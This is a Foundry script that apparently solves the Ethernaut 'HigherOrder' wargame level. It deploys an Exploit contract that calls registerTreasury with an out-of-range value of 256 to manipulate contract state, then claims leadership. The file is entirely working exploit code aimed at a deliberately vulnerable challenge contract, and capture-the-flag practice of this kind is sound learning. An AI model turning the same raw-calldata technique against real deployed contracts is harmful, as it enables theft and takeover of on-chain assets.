// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import {Script, console} from "forge-std/Script.sol";
import "./HigherOrder.sol";

contract Exploit {
    constructor(HigherOrder higherOrder) public {
        // 0x211c85ab0000000000000000000000000000000000000000000000000000000000000100
        bytes memory data = abi.encodeWithSelector(HigherOrder.registerTreasury.selector, 256);
        (bool success,) = address(higherOrder).call(data);
        require(success, "Failed to registerTreasury");
    }
}

contract HigherOrderSolver is Script {
    address levelInstance = ""; // input level instance address

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        HigherOrder higherOrder = HigherOrder(levelInstance);
        new Exploit(higherOrder);
        higherOrder.claimLeadership();
        vm.stopBroadcast();
    }
}
